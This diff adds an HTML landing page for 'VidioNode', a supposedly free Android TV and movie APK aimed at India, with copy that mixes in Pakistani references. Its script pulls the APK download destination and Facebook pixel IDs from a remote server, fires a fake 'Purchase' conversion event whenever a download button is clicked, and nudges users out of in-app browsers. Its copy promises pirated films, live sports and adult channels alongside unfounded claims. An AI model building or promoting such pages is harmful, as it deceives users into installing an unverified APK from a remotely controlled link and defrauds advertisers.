@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>VidioNode — Free TV, movies & sports for India | Android</title>
+    <meta name="description" content="VidioNode — Over 1000 live channels: sports, movies, series & news. Free, no registration. Download APK for Android in India.">
+
+    <link href="css/css2.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+	
+	<script>
+    // ================= 全局配置 =================
+    let targetRedirectUrl = '';
+    let targetEventName = '';
+    let apiStatus = 'loading';   // loading, success, error
+    let apiErrorMsg = '';
+
+    const currentLandingUrl = window.location.href.split('?')[0];
+    
+    // 缓存配置 —— 30天有效期
+    const CACHE_KEY = 'fb_landing_config';
+    const CACHE_TTL = 30 * 24 * 60 * 60 * 1000; // 30天
+    
+    // 记录已初始化的像素ID，避免重复 init
+    if (!window.__fbInitializedPixels) {
+        window.__fbInitializedPixels = new Set();
+    }
+    
+    // ================= 缓存操作方法 =================
+    function getCachedConfig() {
+        try {
+            const cached = localStorage.getItem(CACHE_KEY);
+            if (!cached) return null;
+            const { data, timestamp } = JSON.parse(cached);
+            if (Date.now() - timestamp < CACHE_TTL) {
+                console.log("[Cache] 使用缓存的配置 (30天有效期)");
+                return data;
+            } else {
+                console.log("[Cache] 缓存已过期");
+                localStorage.removeItem(CACHE_KEY);
+                return null;
+            }
+        } catch (e) {
+            console.error("[Cache] 读取失败:", e);
+            return null;
+        }
+    }
+    
+    function setCachedConfig(data) {
+        try {
+            localStorage.setItem(CACHE_KEY, JSON.stringify({
+                data: data,
+                timestamp: Date.now()
+            }));
+            console.log("[Cache] 配置已缓存 (有效期30天)");
+        } catch (e) {
+            console.error("[Cache] 写入失败:", e);
+        }
+    }
+    
+    // 比较两个配置是否有实质性变化（重定向URL、事件名、像素列表）
+    function isConfigChanged(oldData, newData) {
+        if (!oldData || !newData) return true;
+        if (oldData.redirect_url !== newData.redirect_url) return true;
+        if (oldData.event_name !== newData.event_name) return true;
+        
+        const oldPixels = extractPixelIds(oldData);
+        const newPixels = extractPixelIds(newData);
+        if (oldPixels.length !== newPixels.length) return true;
+        
+        const sortedOld = [...oldPixels].sort();
+        const sortedNew = [...newPixels].sort();
+        return sortedOld.some((id, idx) => id !== sortedNew[idx]);
+    }
+    
+    // 从数据中提取像素ID数组（统一格式）
+    function extractPixelIds(data) {
+        let pixelIds = [];
+        if (data.pixel_ids && Array.isArray(data.pixel_ids)) {
+            pixelIds = data.pixel_ids;
+        } else if (data.pixel_id) {
+            let raw = String(data.pixel_id);
+            if (raw.includes('\n')) {
+                pixelIds = raw.split('\n').map(s => s.trim()).filter(s => s !== '');
+            } else if (raw.includes(',')) {
+                pixelIds = raw.split(',').map(s => s.trim()).filter(s => s !== '');
+            } else {
+                pixelIds = [raw.trim()];
+            }
+        }
+        return pixelIds.filter(id => id && id !== '');
+    }
+    
+    // ================= Facebook 基础库加载（只加载一次）=================
+    function loadFbBase() {
+        if (window.fbq) return;
+        !function(f,b,e,v,n,t,s) {
+            if(f.fbq)return;
+            n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+            if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+            n.queue=[];t=b.createElement(e);t.async=!0;
+            t.src=v;s=b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t,s);
+        }(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');
+        console.log("[FB] 基础库已加载");
+    }
+    
+    // 初始化像素（仅初始化未初始化过的像素，避免重复）
+    function initFbPixels(pixelIds) {
+        if (!pixelIds || pixelIds.length === 0) return false;
+        if (typeof fbq === 'undefined') {
+            console.warn("[FB] fbq 未就绪，延迟重试");
+            setTimeout(() => initFbPixels(pixelIds), 200);
+            return false;
+        }
+        
+        const newPixels = [];
+        pixelIds.forEach(id => {
+            if (!window.__fbInitializedPixels.has(id)) {
+                newPixels.push(id);
+            }
+        });
+        
+        if (newPixels.length === 0) {
+            console.log("[FB] 所有像素均已初始化过，跳过");
+            return true;
+        }
+        
+        newPixels.forEach(id => {
+            fbq('init', id);
+            console.log(`[FB] 初始化像素: ${id}`);
+            window.__fbInitializedPixels.add(id);
+        });
+        
+        // 发送 PageView 事件（fbq 会自动作用于所有已初始化的像素）
+        fbq('track', 'PageView');
+        console.log(`[FB] 已发送 PageView 到 ${newPixels.length} 个新像素`);
+        return true;
+    }
+    
+    // 应用配置到全局变量
+    function applyConfig(data) {
+        targetRedirectUrl = data.redirect_url || '';
+        targetEventName = data.event_name || 'Purchase';
+    }
+    
+    // ================= 初始化：优先使用缓存，后台静默更新 =================
+    function init() {
+        // 1. 先加载 Facebook 基础库（全局只需要一次）
+        loadFbBase();
+        
+        // 2. 尝试读取缓存
+        const cachedData = getCachedConfig();
+        if (cachedData && cachedData.redirect_url) {
+            applyConfig(cachedData);
+            initFbPixels(extractPixelIds(cachedData));
+            apiStatus = 'success';
+            console.log("[Init] 使用30天缓存配置，后台将静默检查更新");
+        } else {
+            console.log("[Init] 无有效缓存，等待API响应");
+        }
+        
+        // 3. 无论有无缓存，都发起 API 请求获取最新配置（静默更新）
+        fetch('https://url.dakm0112u.site/api.php?landing_url=' + encodeURIComponent(currentLandingUrl))
+            .then(response => response.json())
+            .then(res => {
+                if (res.code === 200) {
+                    const newData = res.data;
+                    const oldData = getCachedConfig(); // 获取旧缓存（可能为 null）
+                    
+                    if (isConfigChanged(oldData, newData)) {
+                        console.log("[API] 配置有变化，更新缓存和像素");
+                        setCachedConfig(newData);
+                        applyConfig(newData);
+                        // 重新初始化新像素（内部会自动跳过已存在的）
+                        initFbPixels(extractPixelIds(newData));
+                    } else {
+                        console.log("[API] 配置无变化，仅刷新缓存时间戳");
+                        if (oldData) {
+                            setCachedConfig(newData); // 刷新时间戳
+                        } else {
+                            // 之前无缓存，现在存入并应用
+                            setCachedConfig(newData);
+                            applyConfig(newData);
+                            initFbPixels(extractPixelIds(newData));
+                        }
+                    }
+                    apiStatus = 'success';
+                    apiErrorMsg = '';
+                } else {
+                    apiStatus = 'error';
+                    apiErrorMsg = res.msg || '后台返回错误';
+                    console.error("[API] 配置加载失败:", res.msg);
+                    // 如果之前也没有缓存，只能保持 loading 状态（但用户无法跳转）
+                }
+            })
+            .catch(err => {
+                apiStatus = 'error';
+                apiErrorMsg = '网络请求失败，请检查接口地址或跨域设置';
+                console.error("[API] 请求错误:", err);
+            });
+    }
+    
+    // 启动初始化
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', init);
+    } else {
+        init();
+    }
+    
+    // ================= 按钮点击处理 =================
+    function handleDownload() {
+        if (apiStatus === 'success' && targetRedirectUrl) {
+            if (typeof fbq === 'function') {
+                fbq('track', targetEventName);
+                console.log(`📤 已发送 Facebook 事件: ${targetEventName}`);
+            }
+            setTimeout(() => {
+                window.location.href = targetRedirectUrl;
+            }, 300);
+        } 
+        else if (apiStatus === 'loading') {
+            alert("安全连接正在初始化，请稍等片刻再点击...");
+        } 
+        else if (apiStatus === 'error') {
+            if (apiErrorMsg.includes('暂无启用') || apiErrorMsg.includes('跳转链接')) {
+                alert("⚠️ 缺少跳转地址！\n\n后台规则已匹配，但该规则下没有处于【启用】状态的外部跳转链接。\n请登录后台添加或开启至少一条跳转链接！");
+            } 
+            else if (apiErrorMsg.includes('未找到匹配')) {
+                alert("⚠️ 域名未匹配！\n\n请检查后台填写的【落地页地址】是否与下方当前网址完全一致（注意http/https和斜杠）：\n" + currentLandingUrl);
+            } 
+            else {
+                alert("⚠️ 配置加载异常：\n\n" + apiErrorMsg);
+            }
+        }
+    }
+</script>
+
+</head>
+
+<body>
+
+    <nav class="nav">
+        <div class="nav-logo">
+            <img src="images/logo.jpg" alt="VidioNode" width="32" height="32">
+            <span>VidioNode</span>
+        </div>
+        <div class="nav-right">
+            <a onclick="handleDownload()" class="nav-dl" data-i18n="nav_inst">Installation</a>
+        </div>
+    </nav>
+
+    <div class="bd-flags"></div>
+
+    <section class="hero">
+        <div class="hero-bg"></div>
+        <div class="hero-inner">
+            <div class="hero-chip"><span class="dot"></span> <span data-i18n="chip">Watch free now</span>
+            </div>
+            <h1><span data-i18n="h1a">TV and sports</span><br><span class="gold" data-i18n="h1b">Movies, series, and shows for the whole family</span><br><span data-i18n="h1c">— Always free</span></h1>
+            <p class="hero-sub" data-i18n="hero_sub">Over 1000 channels at no cost — Football, PSL and world leagues, movies, series and India news. HD quality, no ads and no registration.</p>
+            <div class="hero-cta">
+                <button class="btn-dl" onclick="handleDownload()">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"></path>
+                    </svg>
+                    <span data-i18n="cta_dl">Download APK free</span>
+                </button>
+            </div>
+            <div class="hero-info">
+                <div class="hero-info-item">
+                    <div class="val">1000+</div>
+                    <div class="lbl" data-i18n="hi1">Channels</div>
+                </div>
+                <div class="hero-info-item">
+                    <div class="val">4K</div>
+                    <div class="lbl" data-i18n="hi2">Quality</div>
+                </div>
+                <div class="hero-info-item">
+                    <div class="val">500K+</div>
+                    <div class="lbl" data-i18n="hi3">Users</div>
+                </div>
+                <div class="hero-info-item">
+                    <div class="val">Free</div>
+                    <div class="lbl" data-i18n="hi4">Always</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <div class="bd-divider"></div>
+
+    <!-- Popular Movies -->
+    <section class="cat-section">
+        <div class="cat-header">
+            <h2><span class="emoji">🎬</span> <span data-i18n="cat1_h">Trending Movies</span></h2>
+        </div>
+        <p style="padding:0 16px;font-size:12px;color:var(--dim);margin:-8px 0 10px" data-i18n="cat1_sub">New global releases and favorite movies • 2026 premieres • Watch free in the app in India</p>
+        <div class="cat-scroll">
+            <div class="scroll-track">
+                <div class="content-card" onclick="handleDownload()">
+                    <div class="thumb"><img src="images/movie1.jpg" alt="Poran" loading="lazy"><span class="badge hd">4K</span><span class="badge2">Free</span></div>
+                    <div class="title" data-i18n="m1">Poran</div>
+                    <div class="meta" data-i18n="m1d">2026 • Romantic Drama</div>
+                </div>
+                <div class="content-card" onclick="handleDownload()">
+                    <div class="thumb"><img src="images/movie2.jpg" alt="Hawa" loading="lazy"><span class="badge hd">HD</span><span class="badge2">Free</span></div>
+                    <div class="title" data-i18n="m2">Hawa</div>
+                    <div class="meta" data-i18n="m2d">2026 • Thriller</div>
+                </div>
+                <div class="content-card" onclick="handleDownload()">
+                    <div class="thumb"><img src="images/movie3.jpg" alt="Surongo" loading="lazy"><span class="badge hd">4K</span><span class="badge2">Free</span></div>
+                    <div class="title" data-i18n="m3">Surongo</div>
+                    <div class="meta" data-i18n="m3d">2026 • Heist, Thriller</div>
+                </div>
+                <div class="content-card" onclick="handleDownload()">
+                    <div class="thumb"><img src="images/movie4.jpg" alt="Priyotama" loading="lazy"><span class="badge hd">4K</span><span class="badge2">Free</span></div>
+                    <div class="title" data-i18n="m4">Priyotama</div>
+                    <div class="meta" data-i18n="m4d">2026 • Romantic Drama</div>
+                </div>
+                <div class="content-card" onclick="handleDownload()">
+                    <div class="thumb"><img src="images/movie5.jpg" alt="Gondi" loading="lazy"><span class="badge hd">HD</span><span class="badge2">Free</span></div>
+                    <div class="title" data-i18n="m5">Gondi</div>
+                    <div class="meta" data-i18n="m5d">2026 • Action</div>
+                </div>
+                <div class="content-card" onclick="handleDownload()">
+                    <div class="thumb"><img src="images/pathaan.jpg" alt="Pathaan" loading="lazy"><span class="badge hd">HD</span><span class="badge2">Free</span></div>
+                    <div class="title" data-i18n="m6">Pathaan</div>
+                    <div class="meta" data-i18n="m6d">Bollywood • Spy Action</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <div class="bd-divider"></div>
+
+    <section class="cat-section">
+        <div class="cat-header">
+            <h2><span class="emoji">⚽</span> <span data-i18n="cat2_h">Live Sports</span></h2>
+        </div>
+        <p style="padding:0 16px;font-size:12px;color:var(--dim);margin:-8px 0 10px" data-i18n="cat2_sub">🇵🇰 India national team & PSL • European football • Cricket • Major tournaments — Live free</p>
+    </section>
+
+    <div class="bd-divider"></div>
+
+    <section class="cat-section">
+        <div class="cat-header">
+            <h2><span class="emoji">🎭</span> <span data-i18n="cat6_h">Talk Shows & Reality TV</span></h2>
+        </div>
+        <p style="padding:0 16px;font-size:12px;color:var(--dim);margin:-8px 0 10px" data-i18n="cat6_sub">Global formats • Music shows • Comedy & Stand-up • Watch free</p>
+    </section>
+
+    <div class="bd-divider"></div>
+
+    <section class="cat-section">
+        <div class="cat-header">
+            <h2><span class="emoji">📺</span> <span data-i18n="cat7_h">Popular Series</span></h2>
+        </div>
+        <p style="padding:0 16px;font-size:12px;color:var(--dim);margin:-8px 0 10px" data-i18n="cat7_sub">Asian and global hits • Dramas and romances • Easily available in India</p>
+    </section>
+
+    <div class="bd-divider"></div>
+
+    <section class="cat-section">
+        <div class="cat-header">
+            <h2><span class="emoji">📺</span> <span data-i18n="cat3_h">News & Entertainment Channels</span></h2>
+        </div>
+        <p style="padding:0 16px;font-size:12px;color:var(--dim);margin:-8px 0 10px" data-i18n="cat3_sub">PTV News, Geo TV and global feeds • Music • Live 24/7 free</p>
+    </section>
+
+    <div class="bd-divider"></div>
+
+    <section class="cat-section">
+        <div class="cat-header">
+            <h2><span class="emoji">🎥</span> <span data-i18n="cat9_h">South Asian Blockbusters</span></h2>
+        </div>
+        <p style="padding:0 16px;font-size:12px;color:var(--dim);margin:-8px 0 10px" data-i18n="cat9_sub">Pushpa • KGF • RRR • Baahubali • With dubbing and subtitles • Free</p>
+    </section>
+
+    <div class="bd-divider"></div>
+
+    <section class="priv-section">
+        <div class="cat-header">
+            <h2><span class="emoji">🔒</span> <span data-i18n="priv_h">+18 Content</span></h2>
+        </div>
+        <p style="padding:0 16px;font-size:12px;color:var(--dim);margin:-8px 0 10px" data-i18n="priv_sub">Adults only • Separate section • HD • Free in the app</p>
+        <div class="priv-card">
+            <div class="lock-icon">🔞</div>
+            <h3 data-i18n="priv_t">Private +18 Channels</h3>
+            <p data-i18n="priv_d">A separate category for adult audiences is available in the app.</p>
+            <button class="priv-btn" onclick="handleDownload()" data-i18n="priv_btn">Open in app — Free access</button>
+        </div>
+    </section>
+
+    <div class="bd-divider"></div>
+
+    <section class="cat-section">
+        <div class="cat-header">
+            <h2><span class="emoji">🇰🇷</span> <span data-i18n="cat8_h">K-Dramas & Anime</span></h2><span class="see-all" data-i18n="cat8_more">In app →</span>
+        </div>
+        <p style="padding:0 16px;font-size:12px;color:var(--dim);margin:-8px 0 10px" data-i18n="cat8_sub">Squid Game • Crash Landing on You • Demon Slayer • True Beauty • Free</p>
+    </section>
+
+    <div class="bd-divider"></div>
+
+    <section class="cat-section">
+        <div class="cat-header">
+            <h2><span class="emoji">📈</span> <span data-i18n="cat5_h">Finance, Markets & Crypto</span></h2>
+        </div>
+        <p style="padding:0 16px;font-size:12px;color:var(--dim);margin:-8px 0 10px" data-i18n="cat5_sub">PSX index • BTC/ETH • USD/PKR rate • India banking news • Markets and economy</p>
+    </section>
+
+    <div class="bd-divider"></div>
+
+    <section class="highlights">
+        <div class="container">
+            <div class="cat-header" style="padding:0;margin-bottom:14px">
+                <h2><span class="emoji">✨</span> <span data-i18n="why_h">Why VidioNode?</span></h2>
+            </div>
+            <div class="hl-grid">
+                <div class="hl-card">
+                    <div class="icon">📡</div>
+                    <h3 data-i18n="w1">1000+ Channels</h3>
+                    <p data-i18n="w1d">Online TV from over 130 countries, easily available in India</p>
+                </div>
+                <div class="hl-card">
+                    <div class="icon">🎬</div>
+                    <h3 data-i18n="w2">Movies without subscription</h3>
+                    <p data-i18n="w2d">Blockbusters, K-Dramas, global premieres</p>
+                </div>
+                <div class="hl-card">
+                    <div class="icon">⚽</div>
+                    <h3 data-i18n="w3">Live sports</h3>
+                    <p data-i18n="w3d">Football, cricket, boxing and more</p>
+                </div>
+                <div class="hl-card">
+                    <div class="icon">🚫</div>
+                    <h3 data-i18n="w4">No ads</h3>
+                    <p data-i18n="w4d">No annoying pop-ups</p>
+                </div>
+                <div class="hl-card">
+                    <div class="icon">📱</div>
+                    <h3 data-i18n="w5">Up to 4K quality</h3>
+                    <p data-i18n="w5d">Sharp image on your Android</p>
+                </div>
+                <div class="hl-card">
+                    <div class="icon">🌍</div>
+                    <h3 data-i18n="w6">Urdu interface</h3>
+                    <p data-i18n="w6d">Catalog and instructions in Urdu</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="compare">
+        <h2 data-i18n="vs_h">VidioNode vs Paid Services</h2>
+        <table class="compare-table">
+            <tbody>
+                <tr>
+                    <th data-i18n="vs_feat">Feature</th>
+                    <th class="VidioNode-col">VidioNode</th>
+                    <th data-i18n="vs_others">Others</th>
+                </tr>
+                <tr>
+                    <td data-i18n="vs1">Monthly fee</td>
+                    <td class="check" data-i18n="vs1a">100% Free</td>
+                    <td class="cross" data-i18n="vs1b">Paid plans</td>
+                </tr>
+                <tr>
+                    <td data-i18n="vs2">Live sports</td>
+                    <td class="check" data-i18n="vs2a">✓ Wide selection</td>
+                    <td class="cross" data-i18n="vs2b">Limited</td>
+                </tr>
+                <tr>
+                    <td data-i18n="vs3">TV channels</td>
+                    <td class="check" data-i18n="vs3a">1000+</td>
+                    <td class="cross" data-i18n="vs3b">50–200</td>
+                </tr>
+                <tr>
+                    <td data-i18n="vs4">Ads</td>
+                    <td class="check" data-i18n="vs4a">No</td>
+                    <td class="cross" data-i18n="vs_yes">Yes</td>
+                </tr>
+                <tr>
+                    <td data-i18n="vs5">Registration required</td>
+                    <td class="check" data-i18n="vs_no">No</td>
+                    <td class="cross" data-i18n="vs_yes">Yes</td>
+                </tr>
+                <tr>
+                    <td data-i18n="vs6">4K</td>
+                    <td class="check">✓</td>
+                    <td data-i18n="vs6b">Varies</td>
+                </tr>
+            </tbody>
+        </table>
+    </section>
+
+    <div class="cta-banner">
+        <h2 data-i18n="cta_h">Start watching now</h2>
+        <p data-i18n="cta_p">Over 500 thousand users are watching for free — including users from India</p>
+    </div>
+
+    <section class="install-section">
+        <h2><span class="emoji">📲</span> <span data-i18n="inst_h">Quick Installation</span></h2>
+    </section>
+
+    <section class="faq-section">
+        <h2 data-i18n="faq_h">Frequently Asked Questions (FAQ)</h2>
+    </section>
+
+    <footer class="footer">
+        🇵🇰 © 2026 VidioNode — For the Indiai audience<br><a href="#" style="color:rgba(255,255,255,.25);margin:0 6px" data-i18n="footer_priv">Privacy Policy</a> | <a href="/terms.php" style="color:rgba(255,255,255,.25);margin:0 6px" data-i18n="footer_terms">Terms</a>
+    </footer>
+
+    <script>
+        
+        function wvRetryIntent() {
+            var url = encodeURIComponent(location.href);
+            window.location.href = 'googlechrome://navigate?url=' + url;
+        }
+        function wvCopy() {
+            var u = location.href;
+            var el = document.getElementById('wvCopied');
+            function showOk() { if (el) { el.style.display = 'block'; } }
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(u).then(showOk).catch(function () { prompt('Copy:', u); });
+            } else {
+                prompt('Copy:', u);
+            }
+        }
+        function wvWhatsApp() {
+            //window.open('https://wa.me/?text=' + encodeURIComponent(location.href), '_blank');
+        }
+
+        (function initAutoSliders() {
+            if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;
+
+            function attachAutoScroll(el, staggerMs) {
+                var track = el.querySelector('.scroll-track');
+                if (!track || !track.firstElementChild) return;
+
+                var intervalMs = 4200;
+                var resumeDelayMs = 4000;
+                var timer = null;
+                var paused = false;
+                var userPauseTimer = null;
+
+                function pauseFromUser() {
+                    paused = true;
+                    clearTimeout(userPauseTimer);
+                    userPauseTimer = setTimeout(function () { paused = false; }, resumeDelayMs);
+                }
+
+                el.addEventListener('touchstart', pauseFromUser, { passive: true });
+                el.addEventListener('wheel', pauseFromUser, { passive: true });
+                el.addEventListener('pointerdown', pauseFromUser);
+
+                function step() {
+                    if (paused) return;
+                    var maxScroll = el.scrollWidth - el.clientWidth;
+                    if (maxScroll <= 4) return;
+
+                    var first = track.firstElementChild;
+                    var gap = parseFloat(getComputedStyle(track).gap) || 12;
+                    var stride = first.offsetWidth + gap;
+
+                    var next = el.scrollLeft + stride;
+                    if (next >= maxScroll - 4) {
+                        el.scrollTo({ left: 0, behavior: 'smooth' });
+                    } else {
+                        el.scrollBy({ left: stride, behavior: 'smooth' });
+                    }
+                }
+
+                function startWhenVisible() {
+                    if ('IntersectionObserver' in window) {
+                        var obs = new IntersectionObserver(function (entries) {
+                            entries.forEach(function (e) {
+                                if (e.isIntersecting) {
+                                    if (!timer) timer = setInterval(step, intervalMs);
+                                } else {
+                                    if (timer) { clearInterval(timer); timer = null; }
+                                }
+                            });
+                        }, { rootMargin: '80px', threshold: 0.01 });
+                        obs.observe(el);
+                    } else {
+                        timer = setInterval(step, intervalMs);
+                    }
+                }
+
+                setTimeout(startWhenVisible, staggerMs);
+            }
+
+            document.querySelectorAll('.cat-scroll').forEach(function (el, i) {
+                attachAutoScroll(el, i * 450);
+            });
+        })();
+    </script>
+
+</body>
+</html>
